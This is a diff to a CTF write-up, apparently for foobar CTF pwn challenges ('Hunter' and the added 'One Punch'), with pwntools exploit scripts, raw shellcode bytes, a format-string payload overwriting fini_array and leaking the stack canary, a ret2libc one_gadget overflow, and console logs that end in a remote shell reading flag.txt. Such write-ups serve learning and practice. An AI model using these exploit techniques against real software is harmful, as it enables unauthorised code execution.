@@ -294,7 +294,7 @@ p.sendline(payload)
 p.interactive()
 ```
 
-Output:
+OUTPUT:
 ```console
 ┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf]
 └─$ python2 solve.py                          
@@ -561,9 +561,10 @@ Here's my script:
 ```python
 from pwn import *
 
-context.log_level = 'debug'
 LOCAL = False
 REMOTE = True
+context.arch = 'amd64'
+context.endian = 'little'
 
 if REMOTE:
 	p = remote('chall.nitdgplug.org',30090)
@@ -574,22 +575,30 @@ if LOCAL:
 	
 # ---SET R13 = MAIN_ADDR---
 payload = "\x5B\x48\x31\xC0\xB0\xEE\x48\x29\xC3\x53\x49\x89\xDD\xC3"
+log.info("Sending payload:\n{}".format(hexdump(payload)))
+log.info("PAYLOAD:\n{}".format(disasm(payload)))
 sec_payload = "AAAA"
 p.sendlineafter("What is your name hunter? : ",payload)
 p.sendlineafter("What is your most precious possession? : ",sec_payload)
 
 # ---SET R14 = PUTS_GOT.PLT_ADDR---
 payload = "\x4D\x89\xEE\x48\x31\xC0\x66\xB8\x1F\x2E\x49\x01\xC6\x41\x55\xC3"
+log.info("Sending payload:\n{}".format(hexdump(payload)))
+log.info("PAYLOAD:\n{}".format(disasm(payload)))
 p.sendlineafter("What is your name hunter? : ",payload)
 p.sendlineafter("What is your most precious possession? : ",sec_payload)
 
 # ---SET R15 = PUTS.PLT_ADDR---
 payload = "\x4D\x89\xF7\x48\x31\xC0\x66\xB8\x28\x2F\x49\x29\xC7\x41\x55\xC3"
+log.info("Sending payload:\n{}".format(hexdump(payload)))
+log.info("PAYLOAD:\n{}".format(disasm(payload)))
 p.sendlineafter("What is your name hunter? : ",payload)
 p.sendlineafter("What is your most precious possession? : ",sec_payload)
 
 # ---CALL PUTS(PUTS_GOT.PLT_ADDR)---
 payload = "\x4C\x89\xF7\x41\xFF\xD7\x41\x55\xC3"
+log.info("Sending payload:\n{}".format(hexdump(payload)))
+log.info("PAYLOAD:\n{}".format(disasm(payload)))
 p.sendlineafter("What is your name hunter? : ",payload)
 p.sendlineafter("What is your most precious possession? : ",sec_payload)
 printf_libc = p.recv(6)
@@ -604,83 +613,64 @@ one_gadget = base_libc + 0x45226
 
 # ---POP RSP INTO OUR PAYLOAD2 THEN RET2LIBC---
 payload1 = "\x58"*5 + "\x48\x31\xC0\xC3"
+log.info("Sending payload:\n{}".format(hexdump(payload)))
 payload2 = p64(one_gadget)
 p.sendlineafter("What is your name hunter? : ",payload1)
 p.sendlineafter("What is your most precious possession? : ",payload2)
 p.interactive()
 ```
 
-Output:
+OUTPUT:
 ```console
 ┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/hunter]
-└─$ python2 solve.py                          
+└─$ python2 solve.py
 [+] Opening connection to chall.nitdgplug.org on port 30090: Done
-[DEBUG] Received 0x1c bytes:
-    'What is your name hunter? : '
-[DEBUG] Sent 0xf bytes:
-    00000000  5b 48 31 c0  b0 ee 48 29  c3 53 49 89  dd c3 0a     │[H1·│··H)│·SI·│···│
-    0000000f
-[DEBUG] Received 0x29 bytes:
-    'What is your most precious possession? : '
-[DEBUG] Sent 0x5 bytes:
-    'AAAA\n'
-[DEBUG] Received 0x1c bytes:
-    'What is your name hunter? : '
-[DEBUG] Sent 0x11 bytes:
+[*] Sending payload:
+    00000000  5b 48 31 c0  b0 ee 48 29  c3 53 49 89  dd c3        │[H1·│··H)│·SI·│··│
+    0000000e
+[*] PAYLOAD:
+       0:   5b                      pop    rbx
+       1:   48 31 c0                xor    rax, rax
+       4:   b0 ee                   mov    al, 0xee
+       6:   48 29 c3                sub    rbx, rax
+       9:   53                      push   rbx
+       a:   49 89 dd                mov    r13, rbx
+       d:   c3                      ret
+[*] Sending payload:
     00000000  4d 89 ee 48  31 c0 66 b8  1f 2e 49 01  c6 41 55 c3  │M··H│1·f·│·.I·│·AU·│
-    00000010  0a                                                  │·│
-    00000011
-[DEBUG] Received 0x29 bytes:
-    'What is your most precious possession? : '
-[DEBUG] Sent 0x5 bytes:
-    'AAAA\n'
-[DEBUG] Received 0x1c bytes:
-    'What is your name hunter? : '
-[DEBUG] Sent 0x11 bytes:
+    00000010
+[*] PAYLOAD:
+       0:   4d 89 ee                mov    r14, r13
+       3:   48 31 c0                xor    rax, rax
+       6:   66 b8 1f 2e             mov    ax, 0x2e1f
+       a:   49 01 c6                add    r14, rax
+       d:   41 55                   push   r13
+       f:   c3                      ret
+[*] Sending payload:
     00000000  4d 89 f7 48  31 c0 66 b8  28 2f 49 29  c7 41 55 c3  │M··H│1·f·│(/I)│·AU·│
-    00000010  0a                                                  │·│
-    00000011
-[DEBUG] Received 0x29 bytes:
-    'What is your most precious possession? : '
-[DEBUG] Sent 0x5 bytes:
-    'AAAA\n'
-[DEBUG] Received 0x1c bytes:
-    'What is your name hunter? : '
-[DEBUG] Sent 0xa bytes:
-    00000000  4c 89 f7 41  ff d7 41 55  c3 0a                     │L··A│··AU│··│
-    0000000a
-[DEBUG] Received 0x29 bytes:
-    'What is your most precious possession? : '
-[DEBUG] Sent 0x5 bytes:
-    'AAAA\n'
-[DEBUG] Received 0x6 bytes:
-    00000000  10 d8 94 39  fb 7f                                  │···9│··│
-    00000006
-[*] Printf Libc Address: 0x7ffb3994d810
+    00000010
+[*] PAYLOAD:
+       0:   4d 89 f7                mov    r15, r14
+       3:   48 31 c0                xor    rax, rax
+       6:   66 b8 28 2f             mov    ax, 0x2f28
+       a:   49 29 c7                sub    r15, rax
+       d:   41 55                   push   r13
+       f:   c3                      ret
+[*] Sending payload:
+    00000000  4c 89 f7 41  ff d7 41 55  c3                        │L··A│··AU│·│
+    00000009
+[*] PAYLOAD:
+       0:   4c 89 f7                mov    rdi, r14
+       3:   41 ff d7                call   r15
+       6:   41 55                   push   r13
+       8:   c3                      ret
+[*] Printf Libc Address: 0x7f237928a810
 [*] Paused (press any to continue)
-[DEBUG] Received 0x1c bytes:
-    'What is your name hunter? : '
-[DEBUG] Sent 0xa bytes:
-    00000000  58 58 58 58  58 48 31 c0  c3 0a                     │XXXX│XH1·│··│
-    0000000a
-[DEBUG] Received 0x29 bytes:
-    'What is your most precious possession? : '
-[DEBUG] Sent 0x9 bytes:
-    00000000  26 d2 93 39  fb 7f 00 00  0a                        │&··9│····│·│
+[*] Sending payload:
+    00000000  4c 89 f7 41  ff d7 41 55  c3                        │L··A│··AU│·│
     00000009
 [*] Switching to interactive mode
 $ ls
-[DEBUG] Sent 0x3 bytes:
-    'ls\n'
-[DEBUG] Received 0x33 bytes:
-    'Hunters\n'
-    'Hunters.c\n'
-    'bin\n'
-    'dev\n'
-    'flag.txt\n'
-    'lib\n'
-    'lib32\n'
-    'lib64\n'
 Hunters
 Hunters.c
 bin
@@ -690,16 +680,193 @@ lib
 lib32
 lib64
 $ cat flag.txt
-[DEBUG] Sent 0xd bytes:
-    'cat flag.txt\n'
-[DEBUG] Received 0x19 bytes:
-    'GLUG{egg_HUnTER_cH@MpIoN}'
 GLUG{egg_HUnTER_cH@MpIoN}
 ```
 
 The flag is: `GLUG{egg_HUnTER_cH@MpIoN}`
 
 
+## **One Punch**
+
+### Description
+> Life became boring after I could defeat anyone in a single shot 
+
+We were given a binary file
+
+### Solution
+
+Run checksec on file:
+```console
+┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/one_punch]
+└─$ checksec chall_one
+[*] '/home/kali/Desktop/pwn/foobar_ctf/one_punch/chall_one'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+Decompile with Ghidra:
+```c
+undefined8 vuln(void)
+
+{
+  long in_FS_OFFSET;
+  char local_58 [72];
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  puts("YOU ONLY GET ONE CHANCE SO....");
+  puts(&DAT_00402027);
+  fgets(local_58,0x7c,stdin);
+  printf(local_58);
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+```
+
+We can already see a format string vulnerability:
+
+```c
+printf(local_58);
+```
+
+And potentially a buffer-overflow?
+```c
+char local_58 [72];
+```
+```c
+fgets(local_58,0x7c,stdin);
+```
+
+Without PIE enabled, it became quite trivial to leak puts libc address, and with format string vulnerability we can also leak the canary value. With that in mind, my attack was to overwrite `fini_array` to our `main_addr`, leak `puts_libc_address`, leak `canary` in my first payload
+
+We have these addresses:
+```
+fini = 0x4031e0
+main_addr = 0x00401292
+puts_got = 0x4033e0
+```
+Constructing our first payload:
+```python
+payload = "%12$4754x%12$hn|EOF%15$llx%11$s".ljust(40,"A") + p64(puts_got) + p64(fini)
+```
+`canary` had the offset of `%15$llx`
+
+With leaked puts libc address, we get the libc version. Then on our second run of main function, we will perform a ret2libc attack with one_gadget (similar to the last 2 challenges) and the canary value we leaked
+
+
+Here's my script:
+```python
+from pwn import *
+
+context.log_level = 'debug'
+LOCAL = False
+REMOTE = True
+
+if REMOTE:
+	p = remote('chall.nitdgplug.org',30095)
+if LOCAL:
+	#p = process('./chall_one_patched')
+	p = gdb.debug('./chall_one_patched')
+	log.info("PID: " + str(p.pid))
+
+fini = 0x4031e0
+main_addr = 0x00401292
+puts_got = 0x4033e0
+
+# ---OVERWRITE FINI_ARRAY, LEAK CANARY, LEAK PUTS_LIBC_ADDR---
+payload = "%12$4754x%12$hn|EOF%15$llx%11$s".ljust(40,"A") + p64(puts_got) + p64(fini) 
+p.sendlineafter("|\n",payload)
+
+p.recvuntil("|EOF")
+canary = long(p.recv(16),16)
+log.info("Canary: " + hex(canary))
+tmp = (p.recv(8))
+s1 = ""
+for x in tmp:
+	if(x != "A"):
+		s1 += x
+s1 += chr(0) + chr(0)
+
+puts_libc = u64(s1)
+base_libc = puts_libc - 0x84450
+log.info("Puts libc address: " + hex(puts_libc))
+log.info("Base libc address: " + hex(base_libc))
+
+# ---RET2LIBC---
+one_gadget = base_libc + 0xe3b2e
+payload = "A"*72 + p64(canary) + p64(0) + p64(one_gadget)
+p.sendline(payload)
+p.interactive() 
+```
+
+OUTPUT:
+```console
+┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/one_punch]
+└─$ python2 solve.py
+[+] Opening connection to chall.nitdgplug.org on port 30095: Done
+[DEBUG] Received 0x1e bytes:
+    'YOU ONLY GET ONE CHANCE SO....'
+[DEBUG] Received 0x1c bytes:
+    00000000  0a 7c 20 f0  9f 91 8a 20  50 75 6e 63  68 20 68 61  │·| ·│··· │Punc│h ha│
+    00000010  72 64 65 72  20 f0 9f 91  8a 20 7c 0a               │rder│ ···│· |·│
+    0000001c
+[DEBUG] Sent 0x39 bytes:
+    00000000  25 31 32 24  34 37 35 34  78 25 31 32  24 68 6e 7c  │%12$│4754│x%12│$hn|│
+    00000010  45 4f 46 25  31 35 24 6c  6c 78 25 31  31 24 73 41  │EOF%│15$l│lx%1│1$sA│
+    00000020  41 41 41 41  41 41 41 41  e0 33 40 00  00 00 00 00  │AAAA│AAAA│·3@·│····│
+    00000030  e0 31 40 00  00 00 00 00  0a                        │·1@·│····│·│
+    00000039
+[DEBUG] Received 0x1000 bytes:
+    ' ' * 0x1000
+[DEBUG] Received 0x2f2 bytes:
+    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+    *
+    00000280  20 20 20 20  20 20 20 20  20 20 20 20  34 30 33 31  │    │    │    │4031│
+    00000290  65 30 7c 45  4f 46 38 30  32 61 65 64  39 33 37 35  │e0|E│OF80│2aed│9375│
+    000002a0  63 34 64 66  30 30 50 b4  3e 6e aa 7f  41 41 41 41  │c4df│00P·│>n··│AAAA│
+    000002b0  41 41 41 41  41 e0 33 40  59 4f 55 20  4f 4e 4c 59  │AAAA│A·3@│YOU │ONLY│
+    000002c0  20 47 45 54  20 4f 4e 45  20 43 48 41  4e 43 45 20  │ GET│ ONE│ CHA│NCE │
+    000002d0  53 4f 2e 2e  2e 2e 0a 7c  20 f0 9f 91  8a 20 50 75  │SO..│..·|│ ···│· Pu│
+    000002e0  6e 63 68 20  68 61 72 64  65 72 20 f0  9f 91 8a 20  │nch │hard│er ·│··· │
+    000002f0  7c 0a                                               │|·│
+    000002f2
+[*] Canary: 0x802aed9375c4df00
+[*] Puts libc address: 0x7faa6e3eb450
+[*] Base libc address: 0x7faa6e367000
+[DEBUG] Sent 0x61 bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    *
+    00000040  41 41 41 41  41 41 41 41  00 df c4 75  93 ed 2a 80  │AAAA│AAAA│···u│··*·│
+    00000050  00 00 00 00  00 00 00 00  2e ab 44 6e  aa 7f 00 00  │····│····│.·Dn│····│
+    00000060  0a                                                  │·│
+    00000061
+[*] Switching to interactive mode
+AAAAAAA�3@YOU ONLY GET ONE CHANCE SO....
+| 👊 Punch harder 👊 |
+[DEBUG] Received 0x48 bytes:
+    'A' * 0x48
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ ls[DEBUG] Sent 0x3 bytes:
+    'ls\n'
+[DEBUG] Received 0xf bytes:
+    'chall\n'
+    'flag.txt\n'
+chall
+flag.txt
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    'cat flag.txt\n'
+[DEBUG] Received 0x2d bytes:
+    'GLUG{0ne_5t3p_On3_Punch_On3_r0und_4t_4_t1m3}\n'
+GLUG{0ne_5t3p_On3_Punch_On3_r0und_4t_4_t1m3}
+```
+
+The flag is: `GLUG{0ne_5t3p_On3_Punch_On3_r0und_4t_4_t1m3}`
 
 
 
